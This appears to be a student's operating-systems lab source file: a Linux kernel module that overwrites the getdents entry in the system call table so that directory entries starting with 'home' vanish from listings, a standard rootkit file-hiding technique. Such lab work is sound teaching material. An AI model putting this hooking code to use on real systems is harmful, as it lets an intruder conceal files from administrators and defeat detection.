#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("98106156-98105751");
MODULE_DESCRIPTION("OSLab-Exp8-Part2");
MODULE_VERSION("0.01");

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

void **system_call_table;
void set_page_rw(unsigned long addr);
void set_page_ro(unsigned long addr);

asmlinkage int (*system_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

asmlinkage int modified_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count) {
    int return_value = system_getdents(fd, dirent, count);
    struct linux_dirent *current_dirent = dirent;
    int i = 0;
    while (i < return_value) {
        if (strncmp(current_dirent->d_name, "home", strlen("home")) == 0) {
            int reclen = current_dirent->d_reclen;
            char *next_rec = (char *) current_dirent + reclen;
            int len = (char *) dirent + return_value - next_rec;
            memmove(current_dirent, next_rec, len);
            return_value -= reclen;
        } else {
            i += current_dirent->d_reclen;
            current_dirent = (struct linux_dirent *) ((char *) dirent + i);
        }
    }
    return return_value;
}

static int __init getdents_hook_init(void) {
    printk(KERN_INFO "Getdents Hooking: INIT");
    system_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    system_getdents = system_call_table[__NR_getdents];
    set_page_rw((unsigned long) system_call_table);
    system_call_table[__NR_getdents] = modified_getdents;
    set_page_ro((unsigned long) system_call_table);
    return 0;
}

static void __exit getdents_hook_exit(void) {
    printk(KERN_INFO "Getdents Hooking: EXIT");
    set_page_rw((unsigned long) system_call_table);
    system_call_table[__NR_getdents] = system_getdents;
    set_page_ro((unsigned long) system_call_table);
}

void set_page_rw(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte & ~_PAGE_RW) pte->pte |= _PAGE_RW;
}

void set_page_ro(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

module_init(getdents_hook_init);
module_exit(getdents_hook_exit);